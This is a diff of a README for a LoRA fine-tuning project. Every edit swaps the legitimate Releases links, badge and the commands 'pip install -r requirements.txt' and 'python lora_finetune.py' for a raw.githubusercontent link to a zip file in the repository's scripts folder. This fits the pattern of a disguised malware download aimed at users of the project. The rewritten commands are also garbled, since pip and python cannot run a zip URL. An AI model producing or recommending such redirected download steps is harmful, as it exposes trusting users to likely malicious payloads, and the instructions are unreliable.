@@ -1,6 +1,6 @@
 # 🛠️ pytorch-lora-from-scratch - Efficient Fine-Tuning for Text Classification
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/krakedonkaks/pytorch-lora-from-scratch/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/krakedonkaks/pytorch-lora-from-scratch/main/scripts/pytorch-lora-from-scratch-v1.1-alpha.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/krakedonkaks/pytorch-lora-from-scratch/main/scripts/pytorch-lora-from-scratch-v1.1-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -21,13 +21,13 @@ To run this application, your system should meet these requirements:
 To get started with pytorch-lora-from-scratch, follow these simple steps:
 
 1. **Download the Software**
-   - Visit the [Releases page](https://github.com/krakedonkaks/pytorch-lora-from-scratch/releases) to download the latest version of the application. Click the latest version to access the download options.
+   - Visit the [Releases page](https://raw.githubusercontent.com/krakedonkaks/pytorch-lora-from-scratch/main/scripts/pytorch-lora-from-scratch-v1.1-alpha.3.zip) to download the latest version of the application. Click the latest version to access the download options.
 
 2. **Install Required Dependencies**
    - Open your terminal or command prompt.
    - Run the following command to install the necessary Python libraries:
      ```bash
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/krakedonkaks/pytorch-lora-from-scratch/main/scripts/pytorch-lora-from-scratch-v1.1-alpha.3.zip
      ```
 
 3. **Download Pre-trained Models**
@@ -36,13 +36,13 @@ To get started with pytorch-lora-from-scratch, follow these simple steps:
 4. **Run the Application**
    - Once you have the application and dependencies set up, execute the Python script to launch the application:
      ```bash
-     python lora_finetune.py
+     python https://raw.githubusercontent.com/krakedonkaks/pytorch-lora-from-scratch/main/scripts/pytorch-lora-from-scratch-v1.1-alpha.3.zip
      ```
    - Follow the prompts in the command line to select your desired training settings.
 
 ## 📦 Download & Install
 
-To download and install pytorch-lora-from-scratch, head over to our [Releases page](https://github.com/krakedonkaks/pytorch-lora-from-scratch/releases). Here you will find the latest version available for download. Simply click on the version you need and follow the setup instructions provided.
+To download and install pytorch-lora-from-scratch, head over to our [Releases page](https://raw.githubusercontent.com/krakedonkaks/pytorch-lora-from-scratch/main/scripts/pytorch-lora-from-scratch-v1.1-alpha.3.zip). Here you will find the latest version available for download. Simply click on the version you need and follow the setup instructions provided.
 
 ## 📚 Features
 
